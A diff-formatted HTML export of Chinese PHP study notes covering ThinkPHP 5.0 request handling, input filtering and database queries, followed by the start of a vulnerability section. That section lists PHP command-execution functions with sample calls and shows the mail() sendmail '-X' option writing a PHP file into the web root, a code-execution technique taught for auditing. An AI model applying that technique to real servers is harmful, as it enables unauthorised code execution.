+</div>
+<div id="outline-container-h:ca0b4432-a680-4cf4-9fb6-b4b836a9dadd" class="outline-4">
+<h4 id="h:ca0b4432-a680-4cf4-9fb6-b4b836a9dadd"><a href="#h:ca0b4432-a680-4cf4-9fb6-b4b836a9dadd">MVC模式</a></h4>
+<div class="outline-text-4" id="text-h:ca0b4432-a680-4cf4-9fb6-b4b836a9dadd">
+<p>
+MVC的全名是Model View Controller，是模型(Model)－视图(view)－控制器(controller)的缩写，是一种设计模式。它是用一种业务逻辑、数据与界面显示分离的方法 <b>来组织代码</b> ，将众多的业务逻辑聚集到一个部件里面，在需要改进和个性化定制界面及用户交互的同时，不需要重新编写业务逻辑，达到减少编码的时间，提高代码复用性。
+</p>
+
+<p>
+使用的MVC的目的：它将这些对象、显示、控制分离以提高软件的的灵活性和复用性，MVC结构可以使程序具有对象化的特征，也更容易维护。
+</p>
+
+<ul class="org-ul">
+<li>模型层（Model）：指从现实世界中抽象出来的对象模型，是应用逻辑的反应；它封装了数据和对数据的操作，是实际进行数据处理的地方（模型层与数据库才有交互）</li>
+<li>视图层（View）：是应用和用户之间的接口，它负责将应用显示给用户 和 显示模型的状态。</li>
+<li>控制器（Controller）:控制器负责视图和模型之间的交互，控制对用户输入的响应、响应方式和流程；它主要负责两方面的动作，一是把用户的请求分发到相应的模型，二是吧模型的改变及时地反映到视图上。</li>
+</ul>
+</div>
+</div>
+<div id="outline-container-h:9400a028-4c64-4ff9-a035-54ef4789f768" class="outline-4">
+<h4 id="h:9400a028-4c64-4ff9-a035-54ef4789f768"><a href="#h:9400a028-4c64-4ff9-a035-54ef4789f768">控制器</a></h4>
+<div class="outline-text-4" id="text-h:9400a028-4c64-4ff9-a035-54ef4789f768">
+<p>
+每个模块拥有独立的 MVC 类库及配置文件，一个模块下面有多个控制器负责响应请求，而每个控制器其实就是一个独立的控制器类。
+</p>
+
+<p>
+控制器主要负责请求的接收，并调用相关的模型处理，并最终通过视图输出。严格来说，控制器不应该过多的介入业务逻辑处理。
+</p>
+
+<p>
+事实上，5.0中控制器是可以被跳过的，通过路由我们可以直接把请求调度到某个模型或者其他的类进行处理。
+</p>
+
+<p>
+5.0的控制器类比较灵活，可以无需继承任何基础类库。
+</p>
+
+<p>
+一个典型的 Index 控制器类如下：
+</p>
+<div class="org-src-container">
+<pre class="src src-php">namespace app\index\controller;
+
+class Index
+{
+    public function index()
+     {
+    return 'hello,thinkphp!';
+     }
+}
+</pre>
+</div>
+</div>
+</div>
+<div id="outline-container-h:5e653ed5-65ed-4a52-a627-34dd762c2702" class="outline-4">
+<h4 id="h:5e653ed5-65ed-4a52-a627-34dd762c2702"><a href="#h:5e653ed5-65ed-4a52-a627-34dd762c2702">操作</a></h4>
+<div class="outline-text-4" id="text-h:5e653ed5-65ed-4a52-a627-34dd762c2702">
+<p>
+一个控制器包含多个操作（方法），操作方法是一个URL访问的最小单元。
+</p>
+
+<p>
+下面是一个典型的 Index 控制器的操作方法定义，包含了两个操作方法：
+</p>
+<div class="org-src-container">
+<pre class="src src-php">namespace app\index\controller;
+
+class Index
+{
+    public function index()
+     {
+    return 'index';
+     }
+    public function hello($name)
+     {
+    return 'Hello,'.$name;
+     }
+}
+</pre>
+</div>
+
+<p>
+操作方法可以不使用任何参数，如果定义了一个非可选参数，则该参数必须通过用户请求传入，如果是URL请求，则通常是 $_GET 或者 $_POST 方式传入。
+</p>
+</div>
+</div>
+</div>
+<div id="outline-container-h:98c7b73d-9a34-49b1-8599-08b4790d5d6f" class="outline-3">
+<h3 id="h:98c7b73d-9a34-49b1-8599-08b4790d5d6f"><a href="#h:98c7b73d-9a34-49b1-8599-08b4790d5d6f">检测变量是否设置</a></h3>
+<div class="outline-text-3" id="text-h:98c7b73d-9a34-49b1-8599-08b4790d5d6f">
+<p>
+可以使用 has 方法来检测一个变量参数是否设置，如下：
+</p>
+
+<div class="org-src-container">
+<pre class="src src-php">Request::instance()-&gt;has('id','get');
+Request::instance()-&gt;has('name','post');
+</pre>
+</div>
+
+<p>
+或者使用助手函数
+</p>
+<div class="org-src-container">
+<pre class="src src-php">input('?get.id');
+input('?post.name');
+</pre>
+</div>
+
+<p>
+变量检测可以支持所有支持的系统变量。
+</p>
+</div>
+</div>
+<div id="outline-container-h:b889537f-9a50-4ddf-bbee-3edbe18f3fa3" class="outline-3">
+<h3 id="h:b889537f-9a50-4ddf-bbee-3edbe18f3fa3"><a href="#h:b889537f-9a50-4ddf-bbee-3edbe18f3fa3">变量获取</a></h3>
+<div class="outline-text-3" id="text-h:b889537f-9a50-4ddf-bbee-3edbe18f3fa3">
+<p>
+变量获取使用 \think\Request 类的如下方法及参数：
+</p>
+<div class="org-src-container">
+<pre class="src src-php">变量类型方法('变量名/变量修饰符','默认值','过滤方法')
+</pre>
+</div>
+
+<p>
+变量类型方法包括：
+</p>
+<table>
+
+
+<colgroup>
+<col  class="org-left">
+
+<col  class="org-left">
+</colgroup>
+<thead>
+<tr>
+<th scope="col" class="org-left">方法</th>
+<th scope="col" class="org-left">描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td class="org-left">param</td>
+<td class="org-left">获取当前请求的变量</td>
+</tr>
+
+<tr>
+<td class="org-left">get</td>
+<td class="org-left">获取 $_GET 变量</td>
+</tr>
+
+<tr>
+<td class="org-left">post</td>
+<td class="org-left">获取 $_POST 变量</td>
+</tr>
+
+<tr>
+<td class="org-left">put</td>
+<td class="org-left">获取 PUT 变量</td>
+</tr>
+
+<tr>
+<td class="org-left">delete</td>
+<td class="org-left">获取 DELETE 变量</td>
+</tr>
+
+<tr>
+<td class="org-left">session</td>
+<td class="org-left">获取 $_SESSION 变量</td>
+</tr>
+
+<tr>
+<td class="org-left">cookie</td>
+<td class="org-left">获取 $_COOKIE 变量</td>
+</tr>
+
+<tr>
+<td class="org-left">request</td>
+<td class="org-left">获取 $_REQUEST 变量</td>
+</tr>
+
+<tr>
+<td class="org-left">server</td>
+<td class="org-left">获取 $_SERVER 变量</td>
+</tr>
+
+<tr>
+<td class="org-left">env</td>
+<td class="org-left">获取 $_ENV 变量</td>
+</tr>
+
+<tr>
+<td class="org-left">route</td>
+<td class="org-left">获取 路由（包括PATHINFO） 变量</td>
+</tr>
+
+<tr>
+<td class="org-left">file</td>
+<td class="org-left">获取 $_FILES 变量</td>
+</tr>
+</tbody>
+</table>
+</div>
+<div id="outline-container-h:8ba53f1b-8290-4de1-b88d-9b4b5b97d185" class="outline-4">
+<h4 id="h:8ba53f1b-8290-4de1-b88d-9b4b5b97d185"><a href="#h:8ba53f1b-8290-4de1-b88d-9b4b5b97d185">获取PARAM变量</a></h4>
+<div class="outline-text-4" id="text-h:8ba53f1b-8290-4de1-b88d-9b4b5b97d185">
+<p>
+PARAM变量是框架提供的用于自动识别 GET 、 POST 或者 PUT 请求的一种变量获取方式，是系统推荐的获取请求参数的方法，用法如下：
+</p>
+<div class="org-src-container">
+<pre class="src src-php">// 获取当前请求的name变量
+Request::instance()-&gt;param('name');
+
+// 获取当前请求的所有变量（经过过滤）
+Request::instance()-&gt;param();
+
+// 获取当前请求的所有变量（原始数据）
+Request::instance()-&gt;param(false);
+
+// 获取当前请求的所有变量（包含上传文件）
+Request::instance()-&gt;param(true);
+</pre>
+</div>
+
+<p>
+param方法会把当前请求类型的参数和PATH_INFO变量以及GET请求合并。
+</p>
+
+<p>
+使用助手函数实现：
+</p>
+<div class="org-src-container">
+<pre class="src src-php">input('param.name');
+input('param.');
+或者
+input('name');
+input('');
+</pre>
+</div>
+
+<p>
+因为 input 函数默认就采用PARAM变量读取方式。
+</p>
+</div>
+</div>
+<div id="outline-container-h:4d4876f6-5fe2-41fb-901e-1c294439324a" class="outline-4">
+<h4 id="h:4d4876f6-5fe2-41fb-901e-1c294439324a"><a href="#h:4d4876f6-5fe2-41fb-901e-1c294439324a">获取GET变量</a></h4>
+<div class="outline-text-4" id="text-h:4d4876f6-5fe2-41fb-901e-1c294439324a">
+<div class="org-src-container">
+<pre class="src src-php">Request::instance()-&gt;get('id'); // 获取某个get变量
+Request::instance()-&gt;get('name'); // 获取get变量
+Request::instance()-&gt;get(); // 获取所有的get变量（经过过滤的数组）
+Request::instance()-&gt;get(false); // 获取所有的get变量（原始数组）
+</pre>
+</div>
+
+<p>
+或者使用内置的助手函数 input 方法实现相同的功能：
+</p>
+<div class="org-src-container">
+<pre class="src src-php">input('get.id');
+input('get.name');
+input('get.');
+</pre>
+</div>
+
+<p>
+注：pathinfo地址参数不能通过get方法获取，查看“获取PARAM变量”
+</p>
+</div>
+</div>
+<div id="outline-container-h:ae3e0c26-e38b-4422-a8ad-bf79ce058307" class="outline-4">
+<h4 id="h:ae3e0c26-e38b-4422-a8ad-bf79ce058307"><a href="#h:ae3e0c26-e38b-4422-a8ad-bf79ce058307">获取POST变量</a></h4>
+<div class="outline-text-4" id="text-h:ae3e0c26-e38b-4422-a8ad-bf79ce058307">
+<div class="org-src-container">
+<pre class="src src-php">Request::instance()-&gt;post('name'); // 获取某个post变量
+Request::instance()-&gt;post(); // 获取经过过滤的全部post变量
+Request::instance()-&gt;post(false); // 获取全部的post原始变量
+</pre>
+</div>
+
+<p>
+使用助手函数实现：
+</p>
+<div class="org-src-container">
+<pre class="src src-php">input('post.name');
+input('post.');
+</pre>
+</div>
+</div>
+</div>
+<div id="outline-container-h:538613f5-3214-49c6-9fd8-16d3df6f2984" class="outline-4">
+<h4 id="h:538613f5-3214-49c6-9fd8-16d3df6f2984"><a href="#h:538613f5-3214-49c6-9fd8-16d3df6f2984">获取PUT变量</a></h4>
+<div class="outline-text-4" id="text-h:538613f5-3214-49c6-9fd8-16d3df6f2984">
+<p>
+安全上不允许用put方式
+</p>
+
+<div class="org-src-container">
+<pre class="src src-php">Request::instance()-&gt;put('name'); // 获取某个put变量
+Request::instance()-&gt;put(); // 获取全部的put变量（经过过滤）
+Request::instance()-&gt;put(false); // 获取全部的put原始变量
+</pre>
+</div>
+
+<p>
+使用助手函数实现：
+</p>
+<div class="org-src-container">
+<pre class="src src-php">input('put.name');
+input('put.');
+</pre>
+</div>
+</div>
+</div>
+<div id="outline-container-h:cc73d254-48eb-4fac-9e0b-449732318238" class="outline-4">
+<h4 id="h:cc73d254-48eb-4fac-9e0b-449732318238"><a href="#h:cc73d254-48eb-4fac-9e0b-449732318238">获取REQUEST变量</a></h4>
+<div class="outline-text-4" id="text-h:cc73d254-48eb-4fac-9e0b-449732318238">
+<div class="org-src-container">
+<pre class="src src-php">Request::instance()-&gt;request('id'); // 获取某个request变量
+Request::instance()-&gt;request(); // 获取全部的request变量（经过过滤）
+Request::instance()-&gt;request(false); // 获取全部的request原始变量数据
+</pre>
+</div>
+
+<p>
+使用助手函数实现：
+</p>
+<div class="org-src-container">
+<pre class="src src-php">input('request.id');
+input('request.');
+</pre>
+</div>
+</div>
+</div>
+<div id="outline-container-h:76d3e0a7-e53f-416d-bf20-cd319d36d1c7" class="outline-4">
+<h4 id="h:76d3e0a7-e53f-416d-bf20-cd319d36d1c7"><a href="#h:76d3e0a7-e53f-416d-bf20-cd319d36d1c7">获取SERVER变量</a></h4>
+<div class="outline-text-4" id="text-h:76d3e0a7-e53f-416d-bf20-cd319d36d1c7">
+<div class="org-src-container">
+<pre class="src src-php">Request::instance()-&gt;server('PHP_SELF'); // 获取某个server变量
+Request::instance()-&gt;server(); // 获取全部的server变量
+</pre>
+</div>
+
+<p>
+使用助手函数实现：
+</p>
+<div class="org-src-container">
+<pre class="src src-php">input('server.PHP_SELF');
+input('server.');
+</pre>
+</div>
+</div>
+</div>
+<div id="outline-container-h:0a10eea2-5320-4ceb-8a24-8f7fdf27d130" class="outline-4">
+<h4 id="h:0a10eea2-5320-4ceb-8a24-8f7fdf27d130"><a href="#h:0a10eea2-5320-4ceb-8a24-8f7fdf27d130">获取SESSION变量</a></h4>
+<div class="outline-text-4" id="text-h:0a10eea2-5320-4ceb-8a24-8f7fdf27d130">
+<div class="org-src-container">
+<pre class="src src-php">Request::instance()-&gt;session('user_id'); // 获取某个session变量
+Request::instance()-&gt;session(); // 获取全部的session变量
+</pre>
+</div>
+
+<p>
+使用助手函数实现：
+</p>
+<div class="org-src-container">
+<pre class="src src-php">input('session.user_id');
+input('session.');
+</pre>
+</div>
+</div>
+<div id="outline-container-h:cc435f87-061b-4c8f-9b05-8416a358079f" class="outline-5">
+<h5 id="h:cc435f87-061b-4c8f-9b05-8416a358079f"><a href="#h:cc435f87-061b-4c8f-9b05-8416a358079f">安全分享</a></h5>
+<div class="outline-text-5" id="text-h:cc435f87-061b-4c8f-9b05-8416a358079f">
+<p>
+判断用户权限时，只能拿session中的和数据库中的，不能是用户自己可控的。
+</p>
+
+<p>
+需要跟研发深入沟通才能确认安全风险（问），人力成本较高。
+</p>
+
+<p>
+提出解决方案。
+</p>
+</div>
+</div>
+</div>
+<div id="outline-container-h:4933c288-dcde-4eac-8b65-2c5fb18e5096" class="outline-4">
+<h4 id="h:4933c288-dcde-4eac-8b65-2c5fb18e5096"><a href="#h:4933c288-dcde-4eac-8b65-2c5fb18e5096">获取Cookie变量</a></h4>
+<div class="outline-text-4" id="text-h:4933c288-dcde-4eac-8b65-2c5fb18e5096">
+<div class="org-src-container">
+<pre class="src src-php">Request::instance()-&gt;cookie('user_id'); // 获取某个cookie变量
+Request::instance()-&gt;cookie(); // 获取全部的cookie变量
+</pre>
+</div>
+
+<p>
+使用助手函数实现：
+</p>
+<div class="org-src-container">
+<pre class="src src-php">input('cookie.user_id');
+input('cookie.');
+</pre>
+</div>
+</div>
+</div>
+</div>
+<div id="outline-container-h:2b5a7947-8cd6-4882-ba08-d10328f4cd59" class="outline-3">
+<h3 id="h:2b5a7947-8cd6-4882-ba08-d10328f4cd59"><a href="#h:2b5a7947-8cd6-4882-ba08-d10328f4cd59">变量过滤</a></h3>
+<div class="outline-text-3" id="text-h:2b5a7947-8cd6-4882-ba08-d10328f4cd59">
+<p>
+框架默认没有设置任何过滤规则，你可以是配置文件中设置全局的过滤规则：
+</p>
+<div class="org-src-container">
+<pre class="src src-php">// 默认全局过滤方法 用逗号分隔多个
+'default_filter' =&gt; 'htmlspecialchars',
+</pre>
+</div>
+
+<p>
+也支持使用 Request 对象进行全局变量的获取过滤，过滤方式包括函数、方法过滤，以及PHP内置的Types of filters，我们可以设置全局变量过滤方法，例如：
+</p>
+<div class="org-src-container">
+<pre class="src src-php">Request::instance()-&gt;filter('htmlspecialchars');
+</pre>
+</div>
+
+<p>
+支持设置多个过滤方法，例如：
+</p>
+<div class="org-src-container">
+<pre class="src src-php">Request::instance()-&gt;filter(['strip_tags','htmlspecialchars']),
+</pre>
+</div>
+
+<p>
+也可以在获取变量的时候添加过滤方法，例如：
+</p>
+<div class="org-src-container">
+<pre class="src src-php">Request::instance()-&gt;get('name','','htmlspecialchars'); // 获取get变量 并用htmlspecialchars函数过滤
+Request::instance()-&gt;param('username','','strip_tags'); // 获取param变量 并用strip_tags函数过滤
+Request::instance()-&gt;post('name','','org\Filter::safeHtml'); // 获取post变量 并用org\Filter类的safeHtml方法过滤
+</pre>
+</div>
+
+<p>
+可以支持传入多个过滤规则，例如：
+</p>
+<div class="org-src-container">
+<pre class="src src-php">Request::instance()-&gt;param('username','','strip_tags,strtolower'); // 获取param变量 并依次调用strip_tags、strtolower函数过滤
+</pre>
+</div>
+
+<p>
+Request对象还支持PHP内置提供的Filter ID过滤，例如：
+</p>
+<div class="org-src-container">
+<pre class="src src-php">Request::instance()-&gt;post('email','',FILTER_VALIDATE_EMAIL);
+</pre>
+</div>
+
+<p>
+框架对FilterID做了转换支持，因此也可以使用字符串的方式，例如：
+</p>
+<div class="org-src-container">
+<pre class="src src-php">Request::instance()-&gt;post('email','','email');
+</pre>
+</div>
+
+<p>
+采用字符串方式定义 FilterID 的时候，系统会自动进行一次 filter_id 调用转换成 Filter 常量。
+</p>
+
+<p>
+具体的字符串根据 filter_list 函数的返回值来定义。
+</p>
+
+<p>
+需要注意的是，采用Filter ID 进行过滤的话，如果不符合过滤要求的话 会返回false，因此你需要配合默认值来确保最终的值符合你的规范。
+</p>
+
+<p>
+例如，
+</p>
+<div class="org-src-container">
+<pre class="src src-php">Request::instance()-&gt;post('email','',FILTER_VALIDATE_EMAIL);
+</pre>
+</div>
+
+<p>
+就表示，如果不是规范的email地址的话 返回空字符串。
+</p>
+
+<p>
+如果当前不需要进行任何过滤的话，可以使用（ V5.0.3+ 版本）
+</p>
+<div class="org-src-container">
+<pre class="src src-php">// 获取get变量 并且不进行任何过滤 即使设置了全局过滤
+Request::instance()-&gt;get('name','',null);
+</pre>
+</div>
+</div>
+</div>
+<div id="outline-container-h:c2163427-b70b-4ddb-95ec-9a1126f28d4b" class="outline-3">
+<h3 id="h:c2163427-b70b-4ddb-95ec-9a1126f28d4b"><a href="#h:c2163427-b70b-4ddb-95ec-9a1126f28d4b">获取部分变量</a></h3>
+<div class="outline-text-3" id="text-h:c2163427-b70b-4ddb-95ec-9a1126f28d4b">
+<p>
+如果你只需要获取当前请求的部分参数，可以使用：
+</p>
+<div class="org-src-container">
+<pre class="src src-php">// 只获取当前请求的id和name变量
+Request::instance()-&gt;only('id,name');
+</pre>
+</div>
+
+<p>
+或者使用数组方式
+</p>
+<div class="org-src-container">
+<pre class="src src-php">// 只获取当前请求的id和name变量
+Request::instance()-&gt;only(['id','name']);
+</pre>
+</div>
+
+<p>
+默认获取的是当前请求参数，如果需要获取其它类型的参数，可以使用第二个参数，例如：
+</p>
+<div class="org-src-container">
+<pre class="src src-php">// 只获取GET请求的id和name变量
+Request::instance()-&gt;only(['id','name'],'get');
+// 只获取POST请求的id和name变量
+Request::instance()-&gt;only(['id','name'],'post');
+</pre>
+</div>
+</div>
+</div>
+<div id="outline-container-h:fbec423a-babf-40d5-ab0d-2e3053cb7fce" class="outline-3">
+<h3 id="h:fbec423a-babf-40d5-ab0d-2e3053cb7fce"><a href="#h:fbec423a-babf-40d5-ab0d-2e3053cb7fce">排除部分变量</a></h3>
+<div class="outline-text-3" id="text-h:fbec423a-babf-40d5-ab0d-2e3053cb7fce">
+<p>
+也支持排除某些变量获取，例如
+</p>
+<div class="org-src-container">
+<pre class="src src-php">// 排除id和name变量
+Request::instance()-&gt;except('id,name');
+</pre>
+</div>
+
+<p>
+或者使用数组方式
+</p>
+<div class="org-src-container">
+<pre class="src src-php">// 排除id和name变量
+Request::instance()-&gt;except(['id','name']);
+</pre>
+</div>
+
+<p>
+同样支持指定变量类型获取：
+</p>
+<div class="org-src-container">
+<pre class="src src-php">// 排除GET请求的id和name变量
+Request::instance()-&gt;except(['id','name'],'get');
+// 排除POST请求的id和name变量
+Request::instance()-&gt;except(['id','name'],'post');
+</pre>
+</div>
+</div>
+</div>
+<div id="outline-container-h:aac35fb1-4b0a-4cea-97b7-ee9024ea1832" class="outline-3">
+<h3 id="h:aac35fb1-4b0a-4cea-97b7-ee9024ea1832"><a href="#h:aac35fb1-4b0a-4cea-97b7-ee9024ea1832">变量修饰符</a></h3>
+<div class="outline-text-3" id="text-h:aac35fb1-4b0a-4cea-97b7-ee9024ea1832">
+<p>
+input 函数支持对变量使用修饰符功能，可以更好的过滤变量。
+</p>
+
+<p>
+用法如下：
+</p>
+<div class="org-src-container">
+<pre class="src src-php">input('变量类型.变量名/修饰符');
+或者
+Request::instance()-&gt;变量类型('变量名/修饰符');
+</pre>
+</div>
+
+<p>
+例如：
+</p>
+<div class="org-src-container">
+<pre class="src src-php">input('get.id/d');
+input('post.name/s');
+input('post.ids/a');
+Request::instance()-&gt;get('id/d');
+</pre>
+</div>
+
+<p>
+ThinkPHP5.0版本默认的变量修饰符是 /s ，如果需要传入字符串之外的变量可以使用下面的修饰符，包括：
+</p>
+<table>
+
+
+<colgroup>
+<col  class="org-left">
+
+<col  class="org-left">
+</colgroup>
+<thead>
+<tr>
+<th scope="col" class="org-left">修饰符</th>
+<th scope="col" class="org-left">作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td class="org-left">s</td>
+<td class="org-left">强制转换为字符串类型</td>
+</tr>
+
+<tr>
+<td class="org-left">d</td>
+<td class="org-left">强制转换为整型类型</td>
+</tr>
+
+<tr>
+<td class="org-left">b</td>
+<td class="org-left">强制转换为布尔类型</td>
+</tr>
+
+<tr>
+<td class="org-left">a</td>
+<td class="org-left">强制转换为数组类型</td>
+</tr>
+
+<tr>
+<td class="org-left">f</td>
+<td class="org-left">强制转换为浮点类型</td>
+</tr>
+</tbody>
+</table>
+</div>
+</div>
+<div id="outline-container-h:bf90978e-6889-485b-aff6-0f52665c96a5" class="outline-3">
+<h3 id="h:bf90978e-6889-485b-aff6-0f52665c96a5"><a href="#h:bf90978e-6889-485b-aff6-0f52665c96a5">原生查询</a></h3>
+<div class="outline-text-3" id="text-h:bf90978e-6889-485b-aff6-0f52665c96a5">
+<p>
+Db 类支持原生 SQL 查询操作，主要包括下面两个方法：
+</p>
+</div>
+<div id="outline-container-h:a1460af5-5957-4b52-8b07-344916716a3b" class="outline-4">
+<h4 id="h:a1460af5-5957-4b52-8b07-344916716a3b"><a href="#h:a1460af5-5957-4b52-8b07-344916716a3b">query方法</a></h4>
+<div class="outline-text-4" id="text-h:a1460af5-5957-4b52-8b07-344916716a3b">
+<p>
+query 方法用于执行 SQL 查询操作，如果数据非法或者查询错误则返回false，否则返回查询结果数据集（同 select 方法）。
+</p>
+
+<p>
+使用示例：
+</p>
+<div class="org-src-container">
+<pre class="src src-php">Db::query("select * from think_user where status=1");
+</pre>
+</div>
+</div>
+</div>
+<div id="outline-container-h:b02cdcc9-3a91-4181-8e6c-66b0361d16b9" class="outline-4">
+<h4 id="h:b02cdcc9-3a91-4181-8e6c-66b0361d16b9"><a href="#h:b02cdcc9-3a91-4181-8e6c-66b0361d16b9">execute方法</a></h4>
+<div class="outline-text-4" id="text-h:b02cdcc9-3a91-4181-8e6c-66b0361d16b9">
+<p>
+execute用于更新和写入数据的sql操作，如果数据非法或者查询错误则返回false ，否则返回影响的记录数。
+使用示例：
+</p>
+<div class="org-src-container">
+<pre class="src src-php">Db::execute("update think_user set name='thinkphp' where status=1");
+</pre>
+</div>
+</div>
+</div>
+</div>
+<div id="outline-container-h:194cefec-42cb-4d64-860f-875089fcae54" class="outline-3">
+<h3 id="h:194cefec-42cb-4d64-860f-875089fcae54"><a href="#h:194cefec-42cb-4d64-860f-875089fcae54">参数绑定</a></h3>
+<div class="outline-text-3" id="text-h:194cefec-42cb-4d64-860f-875089fcae54">
+<p>
+支持在原生查询的时候使用参数绑定，包括问号占位符或者命名占位符，例如：
+</p>
+<div class="org-src-container">
+<pre class="src src-php">Db::query('select * from think_user where id=?',[8]);
+Db::execute('insert into think_user (id, name) values (?, ?)',[8,'thinkphp']);
+</pre>
+</div>
+
+<p>
+也支持命名占位符绑定，例如：
+</p>
+<div class="org-src-container">
+<pre class="src src-php">Db::query('select * from think_user where id=:id',['id'=&gt;8]);
+Db::execute('insert into think_user (id, name) values (:id, :name)', ['id'=&gt;8,'name'=&gt;'thinkphp']);
+</pre>
+</div>
+</div>
+</div>
+<div id="outline-container-h:478b49b8-81a9-4263-af43-71bdd0f24872" class="outline-3">
+<h3 id="h:478b49b8-81a9-4263-af43-71bdd0f24872"><a href="#h:478b49b8-81a9-4263-af43-71bdd0f24872">基本查询</a></h3>
+<div class="outline-text-3" id="text-h:478b49b8-81a9-4263-af43-71bdd0f24872">
+<p>
+查询一个数据使用：
+</p>
+<div class="org-src-container">
+<pre class="src src-php">// table方法必须指定完整的数据表名
+Db::table('think_user')-&gt;where('id',1)-&gt;find();
+
+// find 方法查询结果不存在，返回 null
+</pre>
+</div>
+
+
+<p>
+查询数据集使用：
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">Db::table(<span class="org-string">'think_user'</span>)-&gt;where(<span class="org-string">'status'</span>,1)-&gt;select();
+
+// select &#26041;&#27861;&#26597;&#35810;&#32467;&#26524;&#19981;&#23384;&#22312;&#65292;&#36820;&#22238;&#31354;&#25968;&#32452;
+</pre>
+</div>
+
+<p>
+如果设置了数据表前缀参数的话，可以使用
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">Db::name(<span class="org-string">'user'</span>)-&gt;where(<span class="org-string">'id'</span>,1)-&gt;find();
+Db::name(<span class="org-string">'user'</span>)-&gt;where(<span class="org-string">'status'</span>,1)-&gt;select();
+</pre>
+</div>
+</div>
+<div id="outline-container-h:813d3800-811c-4b87-bf51-8ae602558222" class="outline-4">
+<h4 id="h:813d3800-811c-4b87-bf51-8ae602558222"><a href="#h:813d3800-811c-4b87-bf51-8ae602558222">安全分享</a></h4>
+<div class="outline-text-4" id="text-h:813d3800-811c-4b87-bf51-8ae602558222">
+<p>
+只要不是正常写sql的，都是orm语法。orm 自带预编译
+</p>
+
+<p>
+预编译这个动作是谁做的？
+</p>
+<ul class="org-ul">
+<li>数据库，mysql 。orm不是所有地方都支持预编译的。</li>
+</ul>
+</div>
+</div>
+</div>
+</section>
+<section id="outline-container-h:7e1a5b51-d8c2-4e36-b1e9-79734dd10496" class="outline-2">
+<h2 id="h:7e1a5b51-d8c2-4e36-b1e9-79734dd10496"><a href="#h:7e1a5b51-d8c2-4e36-b1e9-79734dd10496">漏洞讲解</a></h2>
+<div class="outline-text-2" id="text-h:7e1a5b51-d8c2-4e36-b1e9-79734dd10496">
+<p>
+主要内容：
+</p>
+<ul class="org-ul">
+<li>mail 函数漏洞</li>
+<li>SQL 注入</li>
+<li>命令执行</li>
+<li>变量覆盖</li>
+<li>XSS</li>
+<li>XXE</li>
+<li>CSRF</li>
+<li>SSRF</li>
+<li>重定向</li>
+<li>文件上传</li>
+<li>反序列化</li>
+<li>Laravel 框架</li>
+<li>防护方案</li>
+<li>函数</li>
+</ul>
+</div>
+<div id="outline-container-h:50204c69-de20-4003-83f9-61890894eff7" class="outline-3">
+<h3 id="h:50204c69-de20-4003-83f9-61890894eff7"><a href="#h:50204c69-de20-4003-83f9-61890894eff7">PHP敏感函数</a></h3>
+<div class="outline-text-3" id="text-h:50204c69-de20-4003-83f9-61890894eff7">
+</div>
+<div id="outline-container-h:5d1ee97e-f887-4109-8d2a-b7339cf9067c" class="outline-4">
+<h4 id="h:5d1ee97e-f887-4109-8d2a-b7339cf9067c"><a href="#h:5d1ee97e-f887-4109-8d2a-b7339cf9067c">命令执行函数</a></h4>
+<div class="outline-text-4" id="text-h:5d1ee97e-f887-4109-8d2a-b7339cf9067c">
+<ul class="org-ul">
+<li><p>
+system: 执行命令并输出结果;
+</p>
+
+<p>
+system('id');
+</p></li>
+
+<li><p>
+exec: 执行命令 只可获取最后一行结果;
+</p>
+
+<p>
+exec('id',$a); print_r($a);
+</p></li>
+
+<li><p>
+passthru: 同 system;
+</p>
+
+<p>
+passthru('id');
+</p></li>
+
+<li><p>
+shell_exec (反引号) : 执行命令并返回结果
+</p>
+
+<p>
+$a=shell_exec('id');print_r($a);$a= id`;print_r($a);
+</p></li>
+
+<li><p>
+popen: 执行命令并建立管道 返回一个指针 使用fread 等函数操作指针进行读写;
+</p>
+
+<p>
+$a=popen("id", "r"); echo fread($a, 2096);
+</p></li>
+
+<li>proc_open: 同 popen (进程控制功能更强大); <a href="https://www.php.net/manual/zh/function.proc-open">见PHP手册</a></li>
+
+<li><p>
+pcntl_exec: 执行命令 只返回是否发生错误
+</p>
+
+<p>
+pcntl_exec('id');
+</p></li>
+</ul>
+
+<p>
+范例：
+</p>
+<div class="org-src-container">
+<pre class="src src-php">&lt;?php
+exec('ping 127.0.0.1',$output,$return_var);
+system('ping -c 127.0.0.1',$return_var);
+passthru('ping 12.0.0.1',$return_var);
+passthru('id');
+shell_exec("ping 127.0.0.1");
+shell_exec(`ping 127.0.0.1`);
+popen("id", "r");
+pcntl_exec('id');
+</pre>
+</div>
+</div>
+<div id="outline-container-h:4f3934ad-ceed-4f58-9ce3-5c103cc4bac0" class="outline-5">
+<h5 id="h:4f3934ad-ceed-4f58-9ce3-5c103cc4bac0"><a href="#h:4f3934ad-ceed-4f58-9ce3-5c103cc4bac0">安全分享</a></h5>
+<div class="outline-text-5" id="text-h:4f3934ad-ceed-4f58-9ce3-5c103cc4bac0">
+<p>
+java没有一个函数直接执行代码、没有文件包含。
+</p>
+
+<p>
+但有反序列化。
+</p>
+</div>
+</div>
+</div>
+<div id="outline-container-h:f66c16d1-40d1-4b3e-b220-1368c21543a9" class="outline-4">
+<h4 id="h:f66c16d1-40d1-4b3e-b220-1368c21543a9"><a href="#h:f66c16d1-40d1-4b3e-b220-1368c21543a9">mail 函数</a></h4>
+<div class="outline-text-4" id="text-h:f66c16d1-40d1-4b3e-b220-1368c21543a9">
+<p>
+php的mail函数声明如下：
+</p>
+
+<p>
+其参数含义分别表示如下：
+</p>
+<ul class="org-ul">
+<li>to，指定邮件接收者，即接收人</li>
+<li>subject，邮件的标题</li>
+<li>message，邮件的正文内容</li>
+<li>additional_headers，指定邮件发送时其他的额外头部，如发送者From，抄送CC，隐藏抄送BCC</li>
+<li>additional_parameters，指定传递给发送程序sendmail的额外参数。</li>
+</ul>
+
+<p>
+在Linux系统上，mail函数在底层实现中，默认调用Linux的sendmail程序发送邮件。在sendmail程序的参数中，有一个 -X 选项，用于记录所有的邮件进出流量至log文件中。
+</p>
+
+<p>
+通过 -X 指定log文件记录邮件流量，实际可以达到写文件的效果。
+</p>
+
+<p>
+例如，如下php代码
+</p>
+<div class="org-src-container">
+<pre class="src src-php">$to = 'Alice@example.com';
+$subject = 'Hello Alice!';
+$message=‘&lt;?php phhpinfo(); ?&gt;’；
+$headers = "CC: somebodyelse@example.com";
+$options = '-OQueueDirectory=/tmp -X/var/www/html/rce.php';
+mail($to, $subject, $message, $headers, $options);
+</pre>
+</div>
+
+<p>
